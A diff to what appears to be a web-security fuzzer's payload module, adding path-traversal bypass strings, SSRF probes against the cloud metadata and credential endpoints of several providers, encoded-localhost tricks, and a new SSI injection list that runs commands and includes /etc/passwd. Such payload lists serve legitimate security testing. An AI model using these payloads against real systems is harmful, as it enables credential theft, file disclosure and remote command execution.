@@ -54,6 +54,13 @@ PATH_TRAVERSAL: List[Payload] = [
     ("..\\..\\..\\windows\\win.ini", "windows traversal"),
     ("/etc/passwd%00.png", "null byte bypass"),
     ("file:///etc/passwd", "file:// scheme"),
+    # Filter-bypass variants.
+    ("..;/..;/..;/etc/passwd", "semicolon bypass (Java/Tomcat)"),
+    ("%2e%2e/%2e%2e/%2e%2e/etc/passwd", "dot-encoded traversal"),
+    ("%2e%2e%2f%2e%2e%2fetc%2fpasswd", "fully-encoded traversal"),
+    ("..%c0%af..%c0%afetc/passwd", "overlong UTF-8 slash bypass"),
+    ("//etc/passwd", "absolute path injection"),
+    ("\\\\attacker.example\\share\\win.ini", "UNC path injection"),
 ]
 
 SSRF: List[Payload] = [
@@ -64,6 +71,18 @@ SSRF: List[Payload] = [
     ("http://0.0.0.0/", "any-interface probe"),
     ("gopher://127.0.0.1:6379/_INFO", "gopher redis probe"),
     ("dict://127.0.0.1:11211/stats", "memcached probe"),
+    # IP-encoding variants that bypass naive allowlist filters.
+    ("http://[fd00:ec2::254]/latest/meta-data/", "aws ipv6 metadata"),
+    ("http://169.254.170.2/v2/credentials/", "aws ecs task metadata"),
+    ("http://metadata/", "azure metadata short name"),
+    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "azure instance metadata"),
+    ("http://100.100.100.200/latest/meta-data/", "alibaba metadata"),
+    ("http://192.0.0.192/latest/meta-data/", "oracle cloud metadata"),
+    ("http://kubernetes.default.svc/api", "kubernetes service probe"),
+    ("http://0x7f000001/", "hex-encoded localhost"),
+    ("http://2130706433/", "decimal-encoded localhost"),
+    ("http://017700000001/", "octal-encoded localhost"),
+    ("http://127.1/", "shortened loopback"),
 ]
 
 HEADER_INJECTION: List[Payload] = [
@@ -136,6 +155,14 @@ OPEN_REDIRECT: List[Payload] = [
     ("https:evil.example.com", "no-slash bypass"),
     ("javascript:alert(1)", "javascript: URI"),
     ("http://127.0.0.1@evil.example.com", "userinfo trick"),
+]
+
+SSI_INJECTION: List[Payload] = [
+    ("<!--#exec cmd=\"id\"-->", "SSI exec command"),
+    ("<!--#include file=\"/etc/passwd\"-->", "SSI file include"),
+    ("<!--#include virtual=\"/etc/passwd\"-->", "SSI virtual include"),
+    ("<!--#exec cgi=\"/bin/cat /etc/passwd\"-->", "SSI cgi exec"),
+    ("<!--#echo var=\"HTTP_USER_AGENT\"-->", "SSI variable echo"),
 ]
 
 
@@ -226,6 +253,7 @@ PAYLOADS: Dict[str, List[Payload]] = {
     "xpath_injection": XPATH_INJECTION,
     "prototype_pollution": PROTOTYPE_POLLUTION,
     "open_redirect": OPEN_REDIRECT,
+    "ssi_injection": SSI_INJECTION,
     # v1.9: empty-sentinel category. The fuzzer special-cases it and picks the
     # real payload list per parameter via TYPE_JUGGLING_BY_TYPE above.
     "type_juggling": [],
@@ -247,6 +275,7 @@ CATEGORY_LABELS: Dict[str, str] = {
     "xpath_injection": "XPath Injection",
     "prototype_pollution": "Prototype Pollution",
     "open_redirect": "Open Redirect",
+    "ssi_injection": "SSI Injection",
     "type_juggling": "Type Juggling (boolean / number / string)",
     # Observational categories emitted by misconfig.py / extra_checks.py / jwt_checks.py / schema_checks.py.
     "misconfiguration": "Misconfiguration",
